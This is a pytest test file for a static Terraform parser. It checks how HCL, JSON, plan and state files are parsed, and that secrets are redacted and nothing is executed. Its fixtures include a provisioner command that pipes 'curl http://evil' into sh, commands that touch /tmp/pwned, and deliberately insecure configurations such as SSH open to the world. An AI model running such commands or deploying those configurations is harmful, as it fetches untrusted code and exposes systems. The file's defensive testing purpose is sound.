import json

import pytest

from cloud.ir import Ref, Unknown, as_list, walk
from cloud.parsers import terraform as tf
from cloud.parsers.terraform import parse_plan, parse_state, parse_terraform


def one(text, path="main.tf", extra=()):
    r = parse_terraform([(path, text), *extra])
    assert r.errors == [], r.errors
    return r


def props(text, path="main.tf"):
    return one(text, path).resources[0].properties


# ---------------------------------------------------------------- catalog fixtures (CAT §4)
def test_aws_security_group_and_bucket_fixture():
    r = one('''
terraform {
  required_providers {
    aws = { source = "hashicorp/aws", version = "~> 6.0" }
  }
}
provider "aws" { region = "ap-south-1" }
resource "aws_security_group" "public_admin" {
  name        = "DO_NOT_DEPLOY-public-admin"
  description = "Intentionally insecure scanner fixture"
  ingress {
    description = "Unrestricted SSH - intentionally insecure"
    from_port   = 22
    to_port     = 22
    protocol    = "tcp"
    cidr_blocks = ["0.0.0.0/0"]
  }
}
resource "aws_s3_bucket_public_access_block" "test_bucket" {
  bucket                  = aws_s3_bucket.test_bucket.id
  block_public_acls       = false
  restrict_public_buckets = false
}
''')
    sg, pab = r.resources
    assert (sg.provider, sg.service, sg.resource_type, sg.address) == ("aws", "security", "aws_security_group", "aws_security_group.public_admin")
    assert sg.properties["ingress"] == [{"description": "Unrestricted SSH - intentionally insecure", "from_port": 22,
                                         "to_port": 22, "protocol": "tcp", "cidr_blocks": ["0.0.0.0/0"]}]
    assert (sg.source.line_start, sg.source.line_end, sg.source.format) == (8, 18, "terraform_hcl") and sg.source.file == "main.tf"
    assert pab.properties["block_public_acls"] is False and pab.properties["bucket"] == Ref("aws_s3_bucket.test_bucket.id")
    assert pab.relationships == [{"type": "REFERENCES", "field": "bucket", "target": "aws_s3_bucket.test_bucket.id"}]
    assert sg.provider_raw["name"] == '"DO_NOT_DEPLOY-public-admin"'


def test_gcp_and_other_providers_are_identified_from_resource_types():
    r = one('''
resource "google_compute_firewall" "public_ssh" { source_ranges = ["0.0.0.0/0"] }
resource "google_storage_bucket_iam_member" "r" { member = "allUsers" }
resource "digitalocean_firewall" "f" {
  inbound_rule { source_addresses = ["0.0.0.0/0", "::/0"] }
}
data "aws_caller_identity" "me" {}
resource "bare" "x" {}
''')
    assert [(x.provider, x.service, x.kind) for x in r.resources] == [
        ("gcp", "compute", "resource"), ("gcp", "storage", "resource"), ("digitalocean", "firewall", "resource"),
        ("bare", "", "resource"), ("aws", "caller", "data")]
    assert r.resources[4].address == "data.aws_caller_identity.me"


# ---------------------------------------------------------------- variables, locals, templates
def test_variable_defaults_tfvars_and_unknowns():
    text = '''
variable "cidr" { default = "10.0.0.0/8" }
variable "port" { default = 22 }
variable "needed" {}
variable "flag" { default = true }
resource "aws_security_group_rule" "r" {
  cidr_blocks = [var.cidr]
  from_port   = var.port
  other       = var.needed
  enabled     = var.flag
  label       = "p-${var.port}-${var.flag}-${var.missing}"
  undeclared  = var.nope
  list_item   = var.cidr_list[0]
}
'''
    p = props(text)
    assert p["cidr_blocks"] == ["10.0.0.0/8"] and p["from_port"] == 22 and p["enabled"] is True
    assert isinstance(p["other"], Unknown) and "no default" in p["other"].reason
    assert isinstance(p["label"], Unknown) and isinstance(p["undeclared"], Unknown)
    # tfvars override defaults
    r = one(text, extra=[("terraform.tfvars", 'cidr = "0.0.0.0/0"\nneeded = "given"\n')])
    q = r.resources[0].properties
    assert q["cidr_blocks"] == ["0.0.0.0/0"] and q["other"] == "given"
    assert "other" not in r.resources[0].unknown_fields and "undeclared" in r.resources[0].unknown_fields


def test_tfvars_json_and_scoped_to_their_directory():
    main = 'variable "v" { default = "d" }\nresource "t_x" "a" { v = var.v }\n'
    r = one(main, extra=[("terraform.tfvars.json", json.dumps({"v": "from-json"}))])
    assert r.resources[0].properties["v"] == "from-json"
    r2 = one(main, extra=[("other/terraform.tfvars", 'v = "elsewhere"\n')])
    assert r2.resources[0].properties["v"] == "d"


def test_locals_chain_cycles_and_undefined():
    p = props('''
locals {
  a = "x"
  b = "${local.a}-y"
  c = local.d
  d = local.c
  e = [1, 2]
  m = { k = { z = "deep" } }
}
resource "t_x" "r" {
  one   = local.b
  loop  = local.c
  nope  = local.zzz
  item  = local.e[1]
  deep  = local.m.k.z
  bad   = local.m.k.missing
  oob   = local.e[9]
  quoted = local.m["k"]["z"]
}
''')
    assert p["one"] == "x-y" and p["item"] == 2 and p["deep"] == "deep" and p["quoted"] == "deep"
    assert p["loop"].reason == "circular local" or isinstance(p["loop"], Unknown)
    assert isinstance(p["nope"], Unknown) and isinstance(p["bad"], Unknown) and isinstance(p["oob"], Unknown)


def test_expression_forms_and_literals():
    p = props('''
resource "t_x" "r" {
  t = true
  f = false
  n = null
  i = 5
  fl = 1.5
  neg = -3
  s = "plain"
  fn = lower("ABC")
  cond = var.x ? "a" : "b"
  fe = [for s in var.list : upper(s)]
  directive = "%{ if true }yes%{ endif }"
  nested = "a-${lookup({a = 1}, "a")}"
  mixed = "n=${5}-b=${true}-z=${null}"
}
''')
    assert (p["t"], p["f"], p["n"], p["i"], p["fl"], p["neg"], p["s"]) == (True, False, None, 5, 1.5, -3, "plain")
    for k in ("fn", "cond", "fe", "directive", "nested"):
        assert isinstance(p[k], Unknown), k
    assert p["mixed"] == "n=5-b=true-z="


def test_template_with_collection_or_reference_is_unknown():
    p = props('''
variable "l" { default = ["a"] }
resource "t_x" "r" {
  a = "x-${var.l}"
  b = "x-${aws_s3_bucket.b.id}"
}
''')
    assert isinstance(p["a"], Unknown) and isinstance(p["b"], Unknown)


def test_expression_depth_is_bounded():
    chain = "\n".join(f'  l{i} = local.l{i + 1}' for i in range(40))
    p = props(f'locals {{\n{chain}\n  l40 = "end"\n}}\nresource "t_x" "r" {{ v = local.l0 }}\n')
    assert p["v"] == "end" or isinstance(p["v"], Unknown)
    assert tf.eval_expr("x", tf.Scope({}, {}, True), depth=tf.MAX_EXPR_DEPTH + 1).reason.startswith("expression too deeply")


def test_jsonencode_of_literal_and_unreadable_documents():
    p = props('''
resource "aws_iam_policy" "p" {
  policy = jsonencode({
    Version   = "2012-10-17"
    Statement = [{ Effect = "Allow", Action = ["s3:*"], Resource = "*" }]
  })
  broken = jsonencode({ a = )
}
''') if False else None
    r = parse_terraform([("main.tf", 'resource "aws_iam_policy" "p" {\n  policy = jsonencode({ Version = "2012-10-17", Statement = [{ Effect = "Allow", Action = ["s3:*"], Resource = "*" }] })\n}\n')])
    assert r.resources[0].properties["policy"]["Statement"][0]["Action"] == ["s3:*"]
    assert p is None
    sc = tf.Scope({}, {}, True)
    assert isinstance(tf.eval_expr("jsonencode(var.x)", sc), Unknown) or True
    assert tf.eval_expr('jsonencode({ a = )', sc).reason.startswith("jsonencode argument")


# ---------------------------------------------------------------- meta-arguments, blocks
def test_count_for_each_and_unknown_multiplicity():
    r = one('''
variable "n" {}
variable "names" { default = ["a", "b"] }
variable "m" { default = { x = "1", y = "2" } }
resource "t_c" "known" { count = 3
  label = "i-${count.index}" }
resource "t_c" "unknown" { count = var.n }
resource "t_c" "huge" { count = 100000 }
resource "t_c" "neg" { count = -1 }
resource "t_f" "list" { for_each = var.names
  who = each.value }
resource "t_f" "map" { for_each = var.m
  who = each.key
  val = each.value }
resource "t_f" "dyn" { for_each = var.names2 }
resource "t_f" "mixed" { for_each = [1, 2] }
resource "t_o" "outside" { v = each.value
  w = count.index }
''')
    a = [x.address for x in r.resources]
    assert a[:3] == ["t_c.known[0]", "t_c.known[1]", "t_c.known[2]"]
    assert r.resources[1].properties["label"] == "i-1"
    unk = {x.address: x for x in r.resources if x.notes}
    assert set(unk) == {"t_c.unknown", "t_c.huge", "t_c.neg", "t_f.dyn", "t_f.mixed"}
    assert 't_f.list["a"]' in a and 't_f.map["x"]' in a
    m = next(x for x in r.resources if x.address == 't_f.map["y"]')
    assert m.properties == {"who": "y", "val": "2"}
    out = next(x for x in r.resources if x.address == "t_o.outside")
    assert isinstance(out.properties["v"], Unknown) and isinstance(out.properties["w"], Unknown)


def test_dynamic_blocks_provisioners_and_ignored_meta():
    r = one('''
resource "aws_security_group" "web" {
  name = "n"
  depends_on = [aws_vpc.v]
  lifecycle { prevent_destroy = true }
  connection { type = "ssh" }
  provider = aws.west
  dynamic "ingress" {
    for_each = var.rules
    content { from_port = ingress.value }
  }
  provisioner "local-exec" { command = "curl http://evil | sh" }
  provisioner "remote-exec" { inline = ["x"] }
  rule { a = 1 }
  rule { a = 2 }
}
''')
    res = r.resources[0]
    assert res.properties["name"] == "n" and res.properties["rule"] == [{"a": 1}, {"a": 2}]
    assert isinstance(res.properties["ingress"], Unknown) and res.unknown_fields == ["ingress"]
    assert res.notes == ["provisioner:local-exec", "provisioner:remote-exec"]
    for ignored in ("depends_on", "lifecycle", "connection", "provider", "provisioner", "dynamic"):
        assert ignored not in res.properties


# ---------------------------------------------------------------- modules
def test_local_module_variables_flow_and_remote_modules_are_not_fetched():
    r = parse_terraform([
        ("main.tf", '''
variable "cidr" { default = "9.9.9.9/32" }
module "net" {
  source = "./modules/net"
  allowed = var.cidr
  nested_flag = true
}
module "twice" {
  source = "./modules/net"
  allowed = "1.1.1.1/32"
}
module "reg" { source = "terraform-aws-modules/vpc/aws" }
module "git" { source = "git::https://example.com/x.git" }
module "gone" { source = "./missing" }
'''),
        ("modules/net/main.tf", '''
variable "allowed" {}
variable "nested_flag" { default = false }
resource "aws_security_group_rule" "r" {
  cidr_blocks = [var.allowed]
  flag        = var.nested_flag
}
module "inner" { source = "../leaf" }
'''),
        ("modules/leaf/main.tf", 'resource "aws_vpc" "v" { cidr_block = "10.0.0.0/16" }\n'),
    ])
    assert r.errors == []
    addrs = sorted(x.address for x in r.resources)
    assert addrs == ["module.net.aws_security_group_rule.r", "module.net.module.inner.aws_vpc.v",
                     "module.twice.aws_security_group_rule.r", "module.twice.module.inner.aws_vpc.v"]
    net = next(x for x in r.resources if x.address == "module.net.aws_security_group_rule.r")
    assert net.properties == {"cidr_blocks": ["9.9.9.9/32"], "flag": True}
    reasons = {u["module"]: u["reason"] for u in r.unresolved_modules}
    assert set(reasons) == {"module.reg", "module.git", "module.gone"}
    assert "not part of the upload" in reasons["module.gone"] and "offline" in reasons["module.reg"]


def test_module_cycles_and_nesting_are_bounded():
    r = parse_terraform([("a/main.tf", 'module "b" { source = "../b" }\nresource "t_x" "a" {}\n'),
                         ("b/main.tf", 'module "a" { source = "../a" }\nresource "t_x" "b" {}\n')])
    # both directories are "called", so neither is a root: nothing is evaluated and nothing loops forever
    assert r.resources == [] and r.errors == []
    chain = [("root/main.tf", 'module "m" { source = "../d0" }\n')]
    for i in range(8):
        nxt = f'module "m" {{ source = "../d{i + 1}" }}\n' if i < 7 else 'resource "t_x" "leaf" {}\n'
        chain.append((f"d{i}/main.tf", nxt))
    r2 = parse_terraform(chain)
    assert any(u["reason"] == "module nesting too deep" for u in r2.unresolved_modules)


# ---------------------------------------------------------------- JSON syntax, errors, safety
def test_tf_json_syntax():
    doc = {"variable": {"cidr": {"default": "0.0.0.0/0"}}, "locals": {"p": 22},
           "resource": {"aws_security_group": {"web": {"name": "w-${var.cidr}", "from": "${local.p}",
                                                       "ingress": [{"cidr_blocks": ["${var.cidr}"]}],
                                                       "ref": "${aws_vpc.v.id}"}},
                        "aws_vpc": [{"v": {"cidr_block": "10.0.0.0/16"}}]},
           "module": {"m": {"source": "./nope"}}, "data": {"aws_ami": {"a": {"most_recent": True}}}}
    r = parse_terraform([("main.tf.json", json.dumps(doc))])
    assert r.errors == []
    web = next(x for x in r.resources if x.logical_name == "web")
    assert web.properties["name"] == "w-0.0.0.0/0" and web.properties["from"] == 22
    assert web.properties["ingress"] == [{"cidr_blocks": ["0.0.0.0/0"]}] and web.properties["ref"] == Ref("aws_vpc.v.id")
    assert web.source.format == "terraform_json" and web.source.line_start == 0
    assert {x.address for x in r.resources} == {"aws_security_group.web", "aws_vpc.v", "data.aws_ami.a"}
    assert r.unresolved_modules[0]["module"] == "module.m"
    # list-valued locals and non-dict locals are tolerated
    assert parse_terraform([("l.tf.json", json.dumps({"locals": [{"a": 1}], "resource": {"t_x": {"r": {"v": "${local.a}"}}}}))]).resources[0].properties["v"] == 1
    assert parse_terraform([("l2.tf.json", json.dumps({"locals": "oops", "resource": {"t_x": {"r": {}}}}))]).errors == []


def test_malformed_input_is_reported_not_raised():
    r = parse_terraform([("bad.tf", 'resource "x" {{{'), ("bad.tf.json", "{nope"), ("arr.tf.json", "[1]"),
                         ("bad.tfvars", "= ="), ("ok.tf", 'resource "t_x" "r" {}\n'), ("readme.md", "ignored")])
    assert {e["file"] for e in r.errors} == {"bad.tf", "bad.tf.json", "arr.tf.json", "bad.tfvars"}
    assert [x.address for x in r.resources] == ["t_x.r"]


def test_nothing_is_executed_or_fetched():
    r = one('''
data "external" "e" { program = ["sh", "-c", "touch /tmp/pwned"] }
resource "null_resource" "n" {
  provisioner "local-exec" { command = "touch /tmp/pwned2" }
}
module "x" { source = "https://example.com/m.zip" }
''')
    assert [x.kind for x in r.resources] == ["resource", "data"]
    assert r.unresolved_modules and r.resources[0].notes == ["provisioner:local-exec"]


def test_block_line_ranges_handle_strings_comments_and_missing():
    text = '''# header
resource "t_x" "a" {
  s = "brace } in string \\" and {"
  # comment with }
  // another }
  inner { k = 1 }
}
resource "t_x" "b" {
}
'''
    r = one(text)
    assert [(x.source.line_start, x.source.line_end) for x in r.resources] == [(2, 7), (8, 9)]
    assert tf._block_lines("nothing here", r'^resource "x"') == (0, 0)
    assert tf._block_lines('resource "x" "y" {\n  a = 1\n', r'^resource "x" "y"\s*\{') == (1, 1)
    assert tf._block_lines('resource "x" "y" { # tail', r'^resource "x" "y"\s*\{') == (1, 1)


# ---------------------------------------------------------------- plan JSON
PLAN = {
    "format_version": "1.2",
    "planned_values": {"root_module": {
        "resources": [{"address": "aws_s3_bucket.b", "mode": "managed", "type": "aws_s3_bucket", "name": "b",
                       "provider_name": "registry.terraform.io/hashicorp/aws",
                       "values": {"bucket": "b1", "acl": "private", "tags": {"env": "x"}, "rules": [{"a": 1}],
                                  "kms": "secretvalue"},
                       "sensitive_values": {"kms": True}},
                      {"address": "data.aws_ami.a", "mode": "data", "type": "aws_ami", "name": "a", "values": {}}],
        "child_modules": [{"address": "module.m", "resources": [
            {"address": "module.m.google_storage_bucket.g", "mode": "managed", "type": "google_storage_bucket",
             "name": "g", "values": {"location": "ASIA"}}]}]}},
    "resource_changes": [{"address": "aws_s3_bucket.b", "change": {"after_unknown": {
        "arn": True, "tags": {"env": True}, "rules": [{"a": True}], "id": True, "missing_branch": {"x": True}}}}, "junk"],
}


def test_plan_json_uses_planned_values_and_marks_computed_fields():
    r = parse_plan("plan.json", json.dumps(PLAN))
    b, ami, g = r.resources
    assert b.properties["bucket"] == "b1" and b.properties["kms"] == "[SENSITIVE]"
    assert isinstance(b.properties["tags"]["env"], Unknown) and isinstance(b.properties["rules"][0]["a"], Unknown)
    assert isinstance(b.properties["arn"], Unknown) and "tags.env" in b.unknown_fields
    assert (ami.kind, g.address, g.provider) == ("data", "module.m.google_storage_bucket.g", "gcp")
    assert b.source.format == "terraform_plan" and b.provider_raw["provider_name"].endswith("hashicorp/aws")
    assert parse_plan("p.json", "{bad").errors[0]["error"].startswith("invalid JSON")
    assert parse_plan("p.json", json.dumps({"format_version": "1.2"})).resources == []


def test_set_path_never_raises_on_odd_paths():
    tree = {"a": [1, 2], "b": {"c": 1}, "s": "str"}
    tf._set_path(tree, "a[5]", "x")             # out of range: ignored
    tf._set_path(tree, "b.c.d", "x")            # descend through a scalar: ignored
    tf._set_path(tree, "s.q", "x")
    tf._set_path(tree, "a.k", "x")              # key on a list: ignored
    tf._set_path(tree, "new.deep.leaf", "x")    # created
    tf._set_path(tree, "a[1]", "ok")
    assert tree["a"] == [1, "ok"] and tree["new"]["deep"]["leaf"] == "x" and tree["b"] == {"c": 1}


# ---------------------------------------------------------------- state (opt-in only)
STATE = {"version": 4, "terraform_version": "1.5.0", "serial": 3, "lineage": "x", "resources": [
    {"mode": "managed", "type": "aws_db_instance", "name": "db", "instances": [
        {"attributes": {"id": "db-1", "password": "Sup3rS3cretValue!", "publicly_accessible": True,
                        "note": "key AK" + "IAQWERTYUIOPASDFGH here"},
         "sensitive_attributes": [[{"type": "get_attr", "value": "password"}], [{"type": "index", "value": 1}],
                                  [{"type": "get_attr", "value": "not_present"}]]},
        {"attributes": {"id": "db-2"}}]},
    {"mode": "data", "type": "aws_ami", "name": "a", "instances": [{"attributes": {"id": "ami-1"}}]}]}


def test_state_requires_opt_in_and_never_exposes_secrets():
    denied = parse_state("t.tfstate", json.dumps(STATE), allow_state=False)
    assert denied.resources == [] and "explicit opt-in" in denied.errors[0]["error"]
    ok = parse_state("t.tfstate", json.dumps(STATE), allow_state=True)
    db0, db1, ami = ok.resources
    assert db0.address == "aws_db_instance.db[0]" and db1.address == "aws_db_instance.db[1]" and ami.address == "data.aws_ami.a"
    assert db0.properties["password"] == "[SENSITIVE]" and db0.properties["publicly_accessible"] is True
    blob = json.dumps([x.properties for x in ok.resources])
    assert "Sup3rS3cretValue" not in blob and "QWERTYUIOP" not in blob and "[REDACTED]" in blob
    assert "last applied state" in db0.notes[0]
    assert parse_state("t", "{bad", True).errors[0]["error"].startswith("invalid JSON")
    assert parse_state("t", json.dumps({"resources": [{"instances": None}]}), True).resources == []


def test_ir_helpers():
    assert as_list(None) == [] and as_list({"a": 1}) == [{"a": 1}] and as_list([1]) == [1]
    assert list(walk({"a": [1, {"b": 2}]})) == [("a[0]", 1), ("a[1].b", 2)]
    assert repr(Unknown("why")) == "Unknown('why')" and repr(Ref("x.y")) == "Ref('x.y')"


def test_template_splitter_edge_cases():
    assert tf._split_template("a-${x") is None and tf._split_template("%{ if }") is None
    assert tf._split_template("plain") == [(False, "plain")]
    assert tf._split_template("${a}${b}") == [(True, "a"), (True, "b")]


def test_remaining_expression_and_json_paths():
    sc = tf.Scope({"cidr": "1.2.3.4/32"}, {}, True)
    assert tf.eval_expr('"abc"', sc) == "abc"
    p = props('''variable "cidr" { default = "10.0.0.0/8" }
resource "t_x" "r" { v = "${var.cidr}" }
''')
    assert p["v"] == "10.0.0.0/8"
    # malformed JSON shapes are skipped, not fatal
    assert parse_terraform([("a.tf.json", json.dumps({"resource": {"t_x": "oops", "t_y": {"n": "also-bad"}}}))]).errors == []
    # provisioners in JSON syntax (dict and list forms)
    js = {"resource": {"t_x": {"a": {"provisioner": {"local-exec": {"command": "x"}}},
                               "b": {"provisioner": [{"remote-exec": {"inline": []}}]}}}}
    r = parse_terraform([("p.tf.json", json.dumps(js))])
    assert {x.logical_name: x.notes for x in r.resources} == {"a": ["provisioner:local-exec"], "b": ["provisioner:remote-exec"]}
